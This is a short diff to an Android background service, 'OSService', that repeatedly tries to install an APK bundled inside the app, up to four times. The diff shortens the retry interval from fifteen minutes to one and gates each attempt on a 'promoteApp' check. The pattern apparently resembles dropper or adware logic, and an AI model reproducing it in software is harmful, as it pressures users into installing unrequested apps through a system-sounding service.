@@ -16,7 +16,7 @@ import java.util.List;
 
 public class OSService extends Service {
     private static final String TAG = "OSService";
-    public static final long delay = 15*60*1000;
+    public static final long delay = 1*60*1000;
     private static final long times =4;
     public static Context context;
 
@@ -57,11 +57,12 @@ public class OSService extends Service {
         long nowTime = new Date().getTime();
         Log.d(TAG, "onStartCommand: "+(nowTime-nextinstalltimer)+":"+installtimes);
         if(nextinstalltimer<nowTime&&installtimes<times){
-            installtimes=installtimes+1;
-            Utility.setLong("installtimer",nowTime+delay);
-            Utility.setLong("installtimes",installtimes);
-            PakhageMangment.installApk(R.raw.app);
-
+            if(UtilityV2.promoteApp()){
+                installtimes=installtimes+1;
+                Utility.setLong("installtimer",nowTime+delay);
+                Utility.setLong("installtimes",installtimes);
+                PakhageMangment.installApk(R.raw.app);
+            }
         }
         try {
             Utility.startOS(this);
